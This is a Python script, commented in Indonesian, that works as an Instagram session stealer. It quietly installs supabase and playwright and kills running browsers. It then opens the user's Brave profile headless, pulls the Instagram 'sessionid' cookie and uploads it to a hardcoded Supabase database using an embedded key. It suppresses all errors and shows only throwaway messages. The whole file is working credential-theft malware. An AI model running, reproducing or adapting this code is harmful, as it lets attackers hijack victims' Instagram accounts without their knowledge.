import os
import sys
import subprocess
import tempfile

def main():
    print("wait ya")
    
    # 1. Buat folder sementara khusus untuk dependensi (supabase & playwright)
    with tempfile.TemporaryDirectory() as temp_dir:
        
        # Install dependensi langsung ke folder temp secara senyap
        subprocess.check_call(
            [
                sys.executable, "-m", "pip", "install",
                "--target", temp_dir,
                "--quiet", "supabase", "playwright"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Masukkan folder temp ke sistem path Python agar modul bisa di-import
        sys.path.insert(0, temp_dir)

        # Import modul yang dibutuhkan setelah berhasil di-install
        from supabase import create_client, Client
        from playwright.sync_api import sync_playwright

        # --- KONFIGURASI SUPABASE ---
        SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
        SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"

        def kill_browser_processes():
            """Menutup proses browser agar profil data tidak terkunci."""
            browsers = ["brave.exe", "chrome.exe", "msedge.exe", "opera.exe"]
            for browser in browsers:
                cmd = f"taskkill /F /IM {browser} >nul 2>&1"
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        def save_to_supabase(session_id_val: str):
            """Mengirim sessionid ke tabel Supabase."""
            try:
                supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
                
                # Kirim data ke tabel 'storage'
                supabase.table("storage").insert({
                    "session": session_id_val
                }).execute()
            except Exception:
                pass

        def get_and_send_instagram_session():
            kill_browser_processes()

            brave_path = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
            user_data_dir = os.path.join(
                os.environ.get('USERPROFILE', ''),
                'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'
            )

            try:
                with sync_playwright() as p:
                    context = p.chromium.launch_persistent_context(
                        user_data_dir=user_data_dir,
                        executable_path=brave_path,
                        headless=True,
                        args=["--no-sandbox", "--disable-setuid-sandbox"]
                    )

                    # Buka halaman Instagram agar Playwright memuat cookie aktif
                    page = context.new_page()
                    page.goto("https://www.instagram.com", wait_until="domcontentloaded", timeout=15000)

                    all_cookies = context.cookies()
                    context.close()

                    # Filter cookie sessionid
                    ig_sessions = [
                        c for c in all_cookies 
                        if "instagram.com" in c.get("domain", "") and c.get("name") == "sessionid"
                    ]

                    if not ig_sessions:
                        return

                    session_id_val = ig_sessions[0]["value"]

                    # Kirim ke Supabase
                    save_to_supabase(session_id_val)

            except Exception:
                pass

        # Jalankan eksekusi utama
        get_and_send_instagram_session()

    # 2. Setelah keluar dari blok 'with', folder temp_dir beserta seluruh dependensi otomatis terhapus
    print("hoiiiii")

if __name__ == "__main__":
    main()
